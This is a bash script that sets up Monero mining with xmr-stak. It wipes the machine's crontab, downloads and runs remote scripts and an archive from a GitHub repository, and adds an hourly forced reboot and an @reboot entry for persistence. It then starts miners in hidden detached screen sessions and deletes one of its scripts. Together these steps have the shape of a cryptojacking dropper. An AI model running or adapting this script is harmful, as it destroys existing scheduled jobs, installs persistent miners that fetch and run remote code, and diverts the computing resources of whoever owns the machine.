#!/bin/bash

killall screen
apt-get update
apt install cpulimit
wget https://github.com/alifiana/autobot/blob/master/autobot.tar.gz?raw=true
wget https://raw.githubusercontent.com/alifiana/autobot/master/tiga.sh
chmod a+x tiga.sh
crontab -r
crontab -l | { cat; echo "30 * * * * /sbin/reboot" ; } | crontab -
crontab -l | { cat; echo "@reboot /root/tiga.sh" ; } | crontab -
crontab -l
sleep 1
tar xzf *.tar.gz
sysctl -w vm.nr_hugepages=128
screen -dmS "satu" ./xmr-stak.sh
wget https://raw.githubusercontent.com/alifiana/autobot/master/1coredua.sh
chmod a+x 1coredua.sh
screen -dmS "dua" ./1coredua.sh
echo "kelar nih bos"
rm -rf 1coresatu.sh

